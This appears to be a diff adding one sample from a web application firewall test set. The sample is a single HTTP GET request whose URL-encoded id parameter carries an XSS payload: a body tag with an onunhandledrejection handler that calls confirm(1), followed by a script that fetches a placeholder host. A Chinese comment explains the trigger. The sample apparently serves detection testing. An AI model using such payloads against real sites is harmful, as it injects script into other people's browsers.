@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_body标签_onunhandledrejection事件-06506525
+# 攻击载荷利用了HTML中的body标签和onunhandledrejection属性，触发confirm()函数，显示一个提示框。捕获到Promise未处理的rejection异常时触发。
+GET /?id=%3Cbody%20onunhandledrejection=confirm%281%29%3E%3Cscript%3Efetch%28%27%2F%2Fxyz%27%29%3C%2Fscript%3E&bid=hd_tag_m8mv26cm HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26cm
+RM-PRO-Token: a95cae62814159d8baa55e2ed2cad3bb
+RM-PRO-Time: 1742808581318
+User-Agent: curl/7.83.1
+
